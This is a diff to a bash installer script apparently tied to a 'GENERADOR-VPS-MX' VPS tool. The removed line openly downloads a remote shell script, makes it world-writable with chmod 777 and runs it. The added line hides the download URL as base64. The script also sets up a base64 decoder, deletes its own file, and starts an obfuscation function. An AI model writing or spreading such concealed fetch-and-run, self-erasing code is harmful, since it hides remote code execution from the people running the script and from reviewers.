@@ -1,7 +1,7 @@
 #!/bin/bash
 IVAR="/etc/http-instas"
 SCPT_DIR="/etc/SCRIPT"
-SCPresq="=wget https://raw.githubusercontent.com/diesel09/genmx8.3/master/GENERADOR-VPS-MX/instgerador.sh; chmod 777 instgerador.sh* && ./instgerador.sh*=
+SCPresq="=aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RpZXNlbDA5L2dlbm14OC4zL21hc3Rlci9HRU5FUkFET1ItVlBTLU1YL2dlcmFkb3I="
 SUB_DOM='base64 -d'
 rm $(pwd)/$0
 ofus () {
